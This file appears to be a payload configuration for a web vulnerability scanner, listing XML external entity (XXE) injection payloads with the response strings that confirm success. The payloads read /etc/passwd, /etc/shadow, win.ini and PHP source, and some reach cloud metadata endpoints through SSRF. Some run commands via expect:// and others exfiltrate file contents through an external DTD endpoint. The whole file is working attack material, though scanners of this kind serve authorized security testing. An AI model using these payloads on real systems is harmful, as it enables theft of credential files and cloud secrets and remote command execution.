[DEFAULT]
payload = None
rules = None

[direct_linux_passwd]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
rules = root:x:0:
    root:*:0:0

[direct_linux_networks]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/networks">]><foo>&xxe;</foo>
rules = link-local

[direct_linux_networks_new]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///usr/etc/networks">]><foo>&xxe;</foo>
rules = link-local

[direct_windows_networks]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/windows/system32/drivers/etc/networks">]><foo>&xxe;</foo>
rules = network name/network number mappings

[out_of_band_linux_no_php]
payload = <?xml version="1.0"?><!DOCTYPE foo SYSTEM "[EXTERNAL_ENDPOINT]dtd/[SESSION_ID]/[PATH_ID]/[PARAM_AS_HEX]/javalin.dtd"><foo>&trick;</foo>
rules = root:x:0:
    root:*:0:0

[out_of_band_windows_no_php]
payload = <?xml version="1.0"?><!DOCTYPE foo SYSTEM "[EXTERNAL_ENDPOINT]dtd/[SESSION_ID]/[PATH_ID]/[PARAM_AS_HEX]/javawin.dtd"><foo>&trick;</foo>
rules = network name/network number mappings

[out_of_band_linux_passwd]
payload = <?xml version="1.0"?>[LF]<!DOCTYPE foo [[LF]<!ENTITY % remote SYSTEM "[EXTERNAL_ENDPOINT]dtd/[SESSION_ID]/[PATH_ID]/[PARAM_AS_HEX]/linux.dtd">[LF]%remote; %intern; %trick; ]>[LF]<xml><test>hello</test></xml>
rules = root:x:0:
    root:*:0:0

[out_of_band_windows_networks]
payload = <?xml version="1.0"?>[LF]<!DOCTYPE foo [[LF]<!ENTITY % remote SYSTEM "[EXTERNAL_ENDPOINT]dtd/[SESSION_ID]/[PATH_ID]/[PARAM_AS_HEX]/windows.dtd">[LF]%remote; %intern; %trick; ]>[LF]<xml><test>hello</test></xml>
rules = network name/network number mappings

[out_of_band_linux_networks]
payload = <?xml version="1.0"?>[LF]<!DOCTYPE foo [[LF]<!ENTITY % remote SYSTEM "[EXTERNAL_ENDPOINT]dtd/[SESSION_ID]/[PATH_ID]/[PARAM_AS_HEX]/linux2.dtd">[LF]%remote; %intern; %trick; ]>[LF]<xml><test>hello</test></xml>
rules = link-local

; ===== PayloadsAllTheThings Additional Payloads =====

; Classic XXE - Linux /etc/shadow
[direct_linux_shadow]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
rules = root:

; Classic XXE - Linux /etc/issue
[direct_linux_issue]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/issue">]><foo>&xxe;</foo>
rules = Ubuntu
    Debian
    CentOS
    Linux

; Classic XXE - Linux /etc/hostname
[direct_linux_hostname]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>
rules = localhost

; Classic XXE - Windows boot.ini
[direct_windows_bootini]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>
rules = [boot loader]

; Classic XXE - Windows win.ini
[direct_windows_winini]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
rules = [fonts]
    [extensions]

; Classic XXE - Windows System.ini
[direct_windows_systemini]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><foo>&xxe;</foo>
rules = [drivers]

; PHP Wrapper - Base64 encode
[php_wrapper_base64]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
rules = cm9vdDp
    cm9vdDo

; PHP Wrapper - Index.php
[php_wrapper_index]
payload = <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>
rules = PD9waHA
    PCFET0NUWVBF

; XInclude Attack - etc/passwd
[xinclude_passwd]
payload = <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
rules = root:x:0:
    root:*:0:0

; XInclude Attack - etc/hostname
[xinclude_hostname]
payload = <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>
rules = localhost

; SSRF via XXE - localhost check
[ssrf_localhost]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>
rules = <!DOCTYPE
    <html

; SSRF via XXE - internal service
[ssrf_internal]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://localhost:8080">]><foo>&xxe;</foo>
rules = <!DOCTYPE
    <html

; XXE in SVG format
[svg_xxe_passwd]
payload = <?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>
rules = root:x:0:
    root:*:0:0

; XXE in SVG format - hostname
[svg_xxe_hostname]
payload = <?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>
rules = localhost

; XXE with PUBLIC keyword
[public_xxe_passwd]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "test" "file:///etc/passwd">]><foo>&xxe;</foo>
rules = root:x:0:
    root:*:0:0

; XXE with CDATA bypass
[cdata_xxe_passwd]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>
rules = root:x:0:
    root:*:0:0

; Alternative encoding - UTF-16
[utf16_xxe_passwd]
payload = <?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
rules = root:x:0:
    root:*:0:0

; Error Based XXE - Linux Local DTD (fontconfig)
[error_based_linux_fontconfig]
payload = <?xml version="1.0"?><!DOCTYPE message [<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"><!ENTITY % constant 'aaa)><!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;<!ELEMENT aa (bb'>%local_dtd;]><message>Test</message>
rules = root:x:0:

; Error Based XXE - Linux Local DTD (scrollkeeper)
[error_based_linux_scrollkeeper]
payload = <?xml version="1.0"?><!DOCTYPE message [<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">%local_dtd;]><message>Test</message>
rules = file:///

; Error Based XXE - Windows Local DTD (cim20)
[error_based_windows_cim20]
payload = <?xml version="1.0"?><!DOCTYPE doc [<!ENTITY % local_dtd SYSTEM "file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd"><!ENTITY % SuperClass '><!ENTITY &#x25; file SYSTEM "file:///c:/windows/win.ini"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">&#x25;eval;&#x25;error;<!ENTITY test "test"'>%local_dtd;]><xxx>anything</xxx>
rules = [fonts]

; Parameter Entity XXE
[parameter_entity_xxe]
payload = <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>
rules = root:x:0:
    root:*:0:0

; Nested Entity XXE
[nested_entity_xxe]
payload = <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "&#x25;b;"><!ENTITY % b SYSTEM "file:///etc/passwd">]><foo>&a;</foo>
rules = root:x:0:

; XXE via expect:// (PHP)
[expect_xxe_id]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
rules = uid=
    gid=

; XXE via expect:// - whoami
[expect_xxe_whoami]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>
rules = root
    www-data
    apache
    nginx

; XXE - AWS metadata
[ssrf_aws_metadata]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
rules = ami-id
    instance-id

; XXE - GCP metadata
[ssrf_gcp_metadata]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>
rules = instance
    project

